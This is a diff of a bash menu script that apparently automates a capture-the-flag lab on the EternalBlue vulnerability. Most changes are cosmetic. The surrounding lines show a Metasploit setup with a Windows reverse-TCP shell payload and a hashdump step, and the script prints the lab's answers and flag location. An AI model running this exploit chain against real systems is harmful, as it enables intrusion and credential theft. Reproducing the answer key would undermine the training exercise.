@@ -134,7 +134,7 @@ echo ""
 echo "========================================="
 echo "     ✅ END OF ETERNALBLUE INTRO         "
 echo "========================================="
-read -p "\n[*] Press Enter to return to the menu..."
+read -p "[*] Press Enter to return to the menu..."
 }
 
 # 📋 Lab task checklist
@@ -157,7 +157,7 @@ show_tasks() {
      sleep 1
     echo "8. Find the flags "
      sleep 4
-     read -p "\n[*] Press Enter to return to the menu..."
+     read -p "[*] Press Enter to return to the menu..."
 }
 
 # 🔌 Function: Connect VPN only
@@ -171,7 +171,7 @@ clear
 
     echo "[+] Starting VPN..."
     sudo openvpn --config "$vpnfile"
-    read -p "\n[*] Press Enter to return to the menu..."
+    read -p "[*] Press Enter to return to the menu..."
 }
 # ⚔️ Function: Run full exploit process
 exploit_lab() {
@@ -208,7 +208,7 @@ set RHOSTS $rhost;
 set LHOST $lhost;
 set LPORT $lport;
 set PAYLOAD windows/x64/shell/reverse_tcp;
-exploit -j;
+exploit -z;
 "
 
     echo -e "\n[*] Waiting for session... Use 'sessions' in a new terminal to verify."
@@ -240,7 +240,6 @@ hashdump;
 # 📖 Lab Q&A section
 show_answers() {
     banner_answers
-    clear
     echo "🔹 How many ports under 1000 are open?"
     echo "➡️  3"
      sleep 1
@@ -274,7 +273,7 @@ show_answers() {
     echo "🔹 Flag3:"
     echo "➡️  C:\\Users\\Administrator\\Documents\\flag3.txt"
      sleep 1
-    read -p "\n[*] Press Enter to return to the menu..."
+    read -p "[*] Press Enter to return to the menu..."
 }
 
 # 🧱 Main menu loop
